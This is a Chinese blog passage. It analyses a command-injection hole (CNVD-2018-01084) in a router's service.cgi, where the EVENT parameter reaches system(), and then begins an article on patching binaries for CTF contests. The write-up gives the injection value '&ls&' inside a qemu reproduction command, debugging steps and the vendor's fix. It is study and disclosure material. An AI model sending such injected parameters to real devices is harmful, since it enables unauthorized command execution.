= FUN_0040a950(<span class="string">&quot;EVENT&quot;</span>);</span><br><span class="line">         __s1 = (<span class="type">char</span> *)FUN_0040a950(<span class="string">&quot;ACTION&quot;</span>);</span><br><span class="line">         iVar4 = FUN_0040a950(<span class="string">&quot;SERVICE&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> ((iVar4 != <span class="number">0</span>) &amp;&amp; (__s1 != (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">             iVar2 = strcasecmp(__s1,<span class="string">&quot;START&quot;</span>);</span><br><span class="line">             <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">                __s1 = <span class="string">&quot;service %s start &gt; /dev/null&quot;</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">else</span> &#123;</span><br><span class="line">                iVar2 = strcasecmp(__s1,<span class="string">&quot;STOP&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">                  __s1 = <span class="string">&quot;service %s stop &gt; /dev/null&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                  iVar2 = strcasecmp(__s1,<span class="string">&quot;RESTART&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span> (iVar2 != <span class="number">0</span>) &#123;</span><br><span class="line">                    __format = <span class="string">&quot;Unknown action - \&#x27;%s\&#x27;&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LAB_0040ab00;</span><br><span class="line">                  &#125;</span><br><span class="line">                  __s1 = <span class="string">&quot;service %s restart &gt; /dev/null&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">goto</span> LAB_0040ac38;</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> &#123;</span><br><span class="line">           __s1 = <span class="string">&quot;event %s &gt; /dev/null&quot;</span>;</span><br><span class="line">           iVar4 = iVar2;</span><br><span class="line">LAB_0040ac38:</span><br><span class="line">           lxmldbc_system(__s1,iVar4);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="built_in">memset</span>(acStack280,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">         iVar4 = <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">goto</span> LAB_0040ac7c;</span><br><span class="line">      &#125;</span><br><span class="line">      __s1 = <span class="string">&quot;Not authorized&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LAB_0040ab48:</span><br><span class="line">    <span class="built_in">snprintf</span>(acStack280,<span class="number">0x100</span>,__s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar4 = strcasecmp(__s1,<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">      uVar3 = <span class="number">0x40</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_0040aad0;</span><br><span class="line">    &#125;</span><br><span class="line">    __format = <span class="string">&quot;Unsupport HTTP request - %s&quot;</span>;</span><br><span class="line">LAB_0040ab00:</span><br><span class="line">    <span class="built_in">snprintf</span>(acStack280,<span class="number">0x100</span>,__format,__s1);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar4 = <span class="number">-1</span>;</span><br><span class="line">LAB_0040ac7c:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;report&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">    __s1 = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    __s1 = <span class="string">&quot;FAILED&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t&lt;result&gt;%s&lt;/result&gt;\n&quot;</span>,__s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t&lt;message&gt;%s&lt;/message&gt;\n&quot;</span>,acStack280);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;/report&gt;&quot;</span>);</span><br><span class="line">  cgibin_clean_tempfiles();</span><br><span class="line">  <span class="keyword">while</span> (__ptr = PTR_LOOP_00420120, (undefined **)PTR_LOOP_00420120 != &amp;PTR_LOOP_00420120) &#123;</span><br><span class="line">    piVar1 = *(<span class="type">int</span> **)(PTR_LOOP_00420120 + <span class="number">4</span>);</span><br><span class="line">    iVar2 = *(<span class="type">int</span> *)PTR_LOOP_00420120;</span><br><span class="line">    __ptr_00 = *(<span class="type">void</span> **)(PTR_LOOP_00420120 + <span class="number">8</span>);</span><br><span class="line">    *piVar1 = iVar2;</span><br><span class="line">    *(<span class="type">int</span> **)(iVar2 + <span class="number">4</span>) = piVar1;</span><br><span class="line">    *(undefined4 *)__ptr = <span class="number">0</span>;</span><br><span class="line">    *(undefined4 *)(__ptr + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (__ptr_00 != (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(__ptr_00);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">void</span> **)(__ptr + <span class="number">0xc</span>) != (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(__ptr + <span class="number">0xc</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> iVar4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>稍微观察一下发现函数内部先处理传递进来的 HTTP 请求，但是这里的请求处理流程很奇怪，利用 getenv 函数从系统环境变量中获取请求字段。</p>
<p>查找文件内容之后发现了调用 cgi 的文件，使用命令在 htdocs 目录查找所有包含 cgi 字符串的文件：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rn &quot;cgi&quot; *</span><br></pre></td></tr></table></figure></div>

<p>得到输出：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">匹配到二进制文件 cgibin</span><br><span class="line">web/js/comm.js:393:	ajaxObj.sendRequest(&quot;hedwig.cgi&quot;, xml.XDoc);</span><br><span class="line">web/js/comm.js:396:/* submit the action type to pigwidgeon.cgi for caching(saving) config or restarting service */</span><br><span class="line">web/js/comm.js:409:	ajaxObj.sendRequest(&quot;pigwidgeon.cgi&quot;, payload);</span><br><span class="line">web/js/postxml.js:44:		AJAX.sendRequest(&quot;captcha.cgi&quot;, &quot;DUMMY=YES&quot;);</span><br><span class="line">web/js/postxml.js:73:		AJAX.sendRequest(&quot;session.cgi&quot;, payload);</span><br><span class="line">web/js/postxml.js:89:		AJAX.sendRequest(&quot;session.cgi&quot;, payload);</span><br><span class="line">webinc/js/wiz_wan_fresetv6.php:859:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/bsc_sms_inbox.php:123:        ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/adv_qos.php:627:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/tools_system.php:67:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/tools_time.php:318:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;SERVICE=DEVICE.TIME&amp;ACTION=RESTART&quot;);</span><br><span class="line">webinc/js/tools_time.php:360:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;SERVICE=DEVICE.TIME&amp;ACTION=RESTART&quot;);</span><br><span class="line">webinc/js/adv_wps.php:230:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/tools_sys_ulcfg.php:67:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/st_ipv6.php:17:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+EventName);</span><br><span class="line">webinc/js/tools_firmware.php:39:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=CHECKFW&quot;);</span><br><span class="line">webinc/js/tools_email.php:153:        ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=SENDMAIL&quot;);</span><br><span class="line">webinc/js/st_device.php:17:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+EventName);</span><br><span class="line">webinc/js/wiz_freset.php:1103:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/adv_dlna.php:179:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+EventName);</span><br><span class="line">webinc/js/adv_routingv6.php:173:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/bsc_lan.php:1027:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/body/tools_system.php:8:	&lt;form id=&quot;dlcfgbin&quot; action=&quot;dlcfg.cgi&quot; method=&quot;post&quot;&gt;</span><br><span class="line">webinc/body/tools_system.php:18:	&lt;form id=&quot;ulcfgbin&quot; action=&quot;seama.cgi&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">webinc/body/tools_firmware.php:63:&lt;form id=&quot;fwup&quot; action=&quot;fwup.cgi&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p>基本都是在 js 中调用的 service.cgi，例如 tools_system.php：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">ajaxObj.<span class="title function_ invoke__">createRequest</span>();</span><br><span class="line">	ajaxObj.onCallback = <span class="function"><span class="keyword">function</span> (<span class="params">xml</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ajaxObj.<span class="title function_ invoke__">release</span>();</span><br><span class="line">		<span class="keyword">if</span> (xml.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;/report/result&quot;</span>)!=<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">			BODY.<span class="title function_ invoke__">ShowAlert</span>(<span class="string">&quot;Internal ERROR!\nEVENT &quot;</span>+svc+<span class="string">&quot;: &quot;</span>+xml.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;/report/message&quot;</span>));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			BODY.<span class="title function_ invoke__">ShowCountdown</span>(banner, msgArray, sec, url);</span><br><span class="line">	&#125;</span><br><span class="line">	ajaxObj.<span class="title function_ invoke__">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">	ajaxObj.<span class="title function_ invoke__">sendRequest</span>(<span class="string">&quot;service.cgi&quot;</span>, <span class="string">&quot;EVENT=&quot;</span>+svc);</span><br></pre></td></tr></table></figure></div>

<p>类似的还有很多，web 端通过 js 构造请求，并将请求发送到 cgibin 进行进一步处理。</p>
<p>回到代码上，首先获取了 REQUEST_METHOD 字段，判断是否为 POST，然后进入 cgibin_parse_request 函数进一步解析 HTTP 请求。</p>
<p>cgibin_parse_request 函数中构造了 sobj 结构体，函数大致功能是取出 CONTENT_TYPE、CONTENT_LENGTH、REQUEST_URI 这几个请求字段，进行进一步操作。</p>
<p>关键点在于 REQUEST_URI，它表示了当前请求的访问参数，关键代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__nptr_00 = getenv(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__nptr_00 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">  iVar4 = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">/* get &#x27;?&#x27; */</span></span><br><span class="line">  __nptr_00 = <span class="built_in">strchr</span>(__nptr_00,<span class="number">0x3f</span>);</span><br><span class="line">  iVar4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (__nptr_00 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">     local_38 = <span class="number">0</span>;</span><br><span class="line">     sVar2 = <span class="built_in">strlen</span>(__nptr_00 + <span class="number">1</span>);</span><br><span class="line">     FUN_00402dc0(&amp;local_38,(<span class="type">int</span>)(__nptr_00 + <span class="number">1</span>),sVar2);</span><br><span class="line">     FUN_00402dc0(&amp;local_38,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">     iVar4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从 REQUEST_URI 中定位 ? ，然后取出问号之后的内容，计算长度。</p>
<p>函数 FUN_00402dc0 的主要功能是对取出的参数进行 URLdecode，并写入某块内存区域。</p>
<p>当 cgibin_parse_request 函数完成了 HTTP 请求解析动作，并且正确的返回，servicecgi_main 函数会继续下一步操作。</p>
<p>首先检查当前用户 session 是否为管理员，对应函数是 sess_ispoweruser，由于在模拟环境中，这个函数无法获取到 session，我们可以直接 patch 掉这个函数。身份验证成功之后继续解析 REQUEST_URI 的内容，涉及的指令有三个：EVENT、ACTION、SERVICE。</p>
<p>观察代码发现 EVENT 的限制最少，当解析到 EVENT 的时候跳出 if 判断，进入 else 流程；</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  __s1 = <span class="string">&quot;event %s &gt; /dev/null&quot;</span>;</span><br><span class="line">  iVar4 = iVar2;</span><br><span class="line">  LAB_0040ac38:</span><br><span class="line">  lxmldbc_system(__s1,iVar4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>关键函数为 lxmldbc_system：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lxmldbc_system</span><span class="params">(<span class="type">char</span> *pcParm1,undefined4 uParm2,undefined4 uParm3,undefined4 uParm4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_res4;</span><br><span class="line">  undefined4 local_res8;</span><br><span class="line">  undefined4 local_resc;</span><br><span class="line">  <span class="type">char</span> acStack1036 [<span class="number">1028</span>];</span><br><span class="line">  </span><br><span class="line">  local_res4 = uParm2;</span><br><span class="line">  local_res8 = uParm3;</span><br><span class="line">  local_resc = uParm4;</span><br><span class="line">  vsnprintf(acStack1036,<span class="number">0x400</span>,pcParm1,&amp;local_res4);</span><br><span class="line">  system(acStack1036);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据传入的参数，这个函数直接使用 vsnprintf 将 “event %s &gt; &#x2F;dev&#x2F;null” 和和用户传入的 EVENT 拼接，并利用 system 执行。</p>
<p>这里显然存在命令注入漏洞，注入的格式大概是；</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Hello&quot;&amp;ls&amp;pwd</span><br></pre></td></tr></table></figure></div>

<p>运行上面的命令可以同时得到三条指令的结果。</p>
<p>如果我们构造 EVENT&#x3D;&amp;ls&amp;，那么拼接出来的结果就是 event &amp;ls&amp; &gt; &#x2F;dev&#x2F;null，从而完成任意命令执行。</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Update(2021-02-24)：当 IDA 使用原生 gdb 调试的时候，会弹出警告信息，提示我们 IDA 无法读取某些内存区域的数据，通常来说这是正常情况，想要读取目标内存数据的话可以手动设置地址范围，具体做法大家可自行搜索。</span><br></pre></td></tr></table></figure></div>

<p>根据逆向分析的结果，我们需要手动传入一些参数以防止程序自动退出。按照网上的教程构造如下命令：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu -0 &quot;service.cgi&quot; -g 10000 -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_LENGTH=10 -E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot;  -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E HTTP_COOKIE=&quot;uid=aaaaa&quot; ./htdocs/cgibin</span><br></pre></td></tr></table></figure></div>

<p>qemu 利用 -0 传入第一个参数，满足 main 函数的需求，进入 servicecgi_main 函数。</p>
<p>利用 -E 选项传入自定义的环境变量，满足判断，REQUEST_URI 中包含待注入的命令（URL 编码）。</p>
<p>在终端运行后打开 gdb-multiarch</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file ./htdocs/cgibin</span><br><span class="line">target remote 127.0.0.1:10000</span><br></pre></td></tr></table></figure></div>

<p>两条命令连接到 cgibin 进程上面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-3.png"
                     
                ></p>
<p>按照程序逻辑我们在 0x0040aad8 下断点，然后运行程序</p>
<p>当返回 gdb 界面的时候 v0 可能是 -1，代表 cgibin_parse_request 的逻辑判断失败。不要慌，我们手动 patch 程序逻辑到正确的分支即：0x0040AB20。这里和网上的文档不同，我猜测是 qemu 的环境问题。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set $pc = 0x40ab20</span><br></pre></td></tr></table></figure></div>

<p>接下来执行到 sess_ispoweruser 函数，程序会进入 20 秒左右的假死状态.</p>
<p>此处我们可以打开 -strace 寻找原因，修改启动命令，添加 -strace 选项再执行，到了 sess_ispoweruser 函数窗口会打印一堆信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-4.png"
                     
                ></p>
<p>问题在于 qemu 模拟环境中找不到 &#x2F;var&#x2F;session 文件，但是函数一直尝试去获取 session，导致程序卡在这里循环。</p>
<p>去除 strace 选项继续调试，patch 掉 session 验证函数，转移到正确分支：0x0040AB58，接着就可以直接在存在漏洞的函数头部下断点了，地址是：00410f14</p>
<p>继续执行 gdb 断在 lxmldbc_system 函数头部，单步调试看到 vsnprintf 函数的几个参数：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-5.png"
                     
                ></p>
<p>显然是把字符串 “&amp;ls&amp;” 拼接到了 “event %s &gt; &#x2F;dev&#x2F;null” 中，来到 system 函数内部，参数为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-6.png"
                     
                ></p>
<p>命令注入成功。</p>
<p>但是不要高兴的太早，如果继续执行程序有很大可能只会打印出如下信息：</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">report</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">result</span>&gt;</span>OK<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">report</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>我们已经注入了 ls 命令，为什么没有效果呢？</p>
<p>再次打开 strace(注意跳过 sess_ispoweruser 函数)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-7.png"
                     
                ></p>
<p>这里找到了答案，execve 系统调用错误，显示找不到文件。后来在大佬的文章上看到这是 qemu 的锅，我的 qemu 是用 apt 安装的，版本在 2.5.0，这个版本的 qemu user 模式没有实现 execve 函数。需要下载 qemu 2.9 版本并且加上 -execve 参数才行(这么说我上一篇漏洞也是由于 qemu 的问题才起不来 shell QAQ)。</p>
<p>关于 2.9 qemu 加 patch 的问题，没有太多的教程，不过我发现 QEMU 3.0.0 版本存在一个 -sandbox 选项，内部有如下描述</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use &#x27;elevateprivileges&#x27; to allow or deny QEMU process to elevate its privileges by blacklisting all set*uid|gid system calls.</span><br><span class="line">The value &#x27;children&#x27; will deny set*uid|gid system calls for main QEMU process but will allow forks and execves to run unprivileged</span><br></pre></td></tr></table></figure></div>

<p>不知道是不是官方添加的 execve 系统调用？</p>
<p>最后看一下官方的修复手段：</p>
<p>下载比较新的固件(1.03 以上)，用 Ghidra 打开，直接定位到存在漏洞的函数附近：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-8.png"
                     
                ></p>
<p>发现函数的参数传递变成了 文件路径 + 参数形式。进入函数内部：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-9.png"
                     
                ></p>
<p>修复手段简单粗暴，直接 fork 出一个新的进程，然后关闭 stdout，利用 execl 执行命令。</p>
<p>由于 execl 的特性，我们再注入的命令就无效了。例如下面两个程序：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;execl test\n&quot;</span>);</span><br><span class="line">        <span class="type">char</span>* var1 = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var2 = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var3 = <span class="string">&quot;-la&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var4 = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">        <span class="type">int</span> ret = execl(var1, var2, var3, var4, (<span class="type">char</span>*)<span class="number">0</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;execl test\n&quot;</span>);</span><br><span class="line">        <span class="type">char</span>* var1 = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var2 = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var3 = <span class="string">&quot;-la&quot;</span>;</span><br><span class="line">        <span class="type">char</span>* var4 = <span class="string">&quot;/etc/passwd&amp;ls&amp;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> ret = execl(var1, var2, var3, var4, (<span class="type">char</span>*)<span class="number">0</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>大家可以自行编译运行查看结果。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>二进制文件应急修复</title>
    <url>/2019/06/16/binary_patch/</url>
    <content><![CDATA[<h2 id="漏洞修复概述"><a href="#漏洞修复概述" class="headerlink" title="漏洞修复概述"></a>漏洞修复概述</h2><p>在具体分析一个漏洞之前，我先将漏洞简单的分一下类，根据漏洞修复的难度，可以把漏洞分为以下四类</p>
<span id="more"></span>

<ol>
<li>后门函数、危险的字符串(&#x2F;bin&#x2F;sh)、输入函数长度溢出(硬编码)等</li>
<li>格式化字符串等</li>
<li>指针悬挂、堆栈溢出(动态长度)等</li>
<li>逻辑漏洞</li>
</ol>
<p>这几类漏洞在 CTF、AWD 比赛中很常见，也是二进制漏洞利用的主要考察点，按照不同的漏洞又可以总结出几种修复方式</p>
<ol>
<li>暴力 nop、修改硬编码数据</li>
<li>替换 GOT 表条目、符号解析信息</li>
<li>第三方工具替换系统函数、添加代码</li>
<li>手动添加代码</li>
</ol>
<p>实际上，无论是何种修复手段，无非是对程序的代码进行添加、删除或者修改，虽然没有源代码，但是开发者们制作出了很多实用工具，灵活实用这些工具，就算没有源代码也可以实现对 binary 的 patch。</p>
<p><strong>Patch 的核心思想：</strong>在不破坏程序原有功能的情况下，加入或者删除部分代码，修复程序的漏洞。</p>
<p>删除代码容易实现，但是插入代码难度就比较高了，具体我们在下面讨论。</p>
<h2 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h2><p>在 patch 二进制文件时几个常用工具：</p>
<ol>
<li>IDA</li>
<li>keypatch</li>
<li>LIEF</li>
</ol>
<p>IDA 无需多言，keypatch 是 IDA 的一个插件，项目地址：<a class="link"   href="https://github.com/keystone-engine/keypatch" >https://github.com/keystone-engine/keypatch<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ，虽然 IDA 自带了一个 patch 工具，但是 keypatch 的功能要远远强于它。</p>
<p>LIEF 是一个支持多个平台的二进制工具，通过 LIEF 可以实现对 binary 的 patch、hook、以及导入、导出函数等操作， 灵活使用能够达到意想不到的效果。</p>
<p>LIEF 有详细的官方教程以及 API 文档，大家可以自行了解用法。</p>
<h2 id="patch-实战"><a href="#patch-实战" class="headerlink" title="patch 实战"></a>patch 实战</h2><p>本文会以几个二进制程序为例，演示如何 patch 漏洞的同时不干扰程序正常功能。</p>
<p>程序的每条指令都有一定的长度，指令与指令之间没有多余字节，当 patch 代码时，可能会遇到添加或删除代码的情况，删除代码比较容易实现，直接使用 nop 指令替代原始代码即可，但是当需要添加、修改代码的时候，经常会遇到字节数不够用的情况，为了保证程序正常运行，我们又不能修改掉正常代码，这时就需要寻找一个合适的空间来保存 shellcode，并且这块空间需要具有可执行权限。</p>
<p>大部分 ELF 程序都有一个 .eh_frame 段，功能描述如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">When gcc generates code that handles exceptions, it produces tables that describe how to unwind the stack. These tables are found in the .eh_frame section. </span><br></pre></td></tr></table></figure></div>

<p>简单来讲，这个段的是编译器自己添加进去的，当代码中包含异常处理操作时就会生成，它的主要作用时描述如何卸载 stack。</p>
<p>一般情况下，程序正常运行的时候是不会触发异常处理代码的，于是这个段就可以作为保存 patch 代码的空间。</p>
<p>一个 binary 的漏洞通常出现在某个函数调用前后，例如指针悬挂漏洞是由于 free 一个 chunk 没有清空它的指针导致的，再如格式化字符串漏洞是参数问题导致的。patch 漏洞的时候一个核心思路是保持程序正常功能的同时，加入检测、修复代码，而最适于实现这个操作的位置就是 call 指令。第一，call 指令长度为 5 个字节，空间充裕，第二，通过 call 跳转的功能可以劫持程序的控制流到我们的 patch 代码上，完成修复之后再通过强制跳转指令回到正确的控制流，对程序的修改很小，相对于增加一个段或者是 libc 的方法来说更加稳定。</p>
<p><strong>Patch 1:</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20190614185335210.png"
                      alt="image-20190614185335210"
                ></p>
<p>很明显的格式化字符串漏洞，造成漏洞的主要原因是 printf 函数参数用户可控。</p>
<p>patch 格式化字符串类的漏洞比较简单，通常直接使用 keypatch 修改 call printf 前后代码，满足 puts(buf) 即可。</p>
<p>patch前：</p>
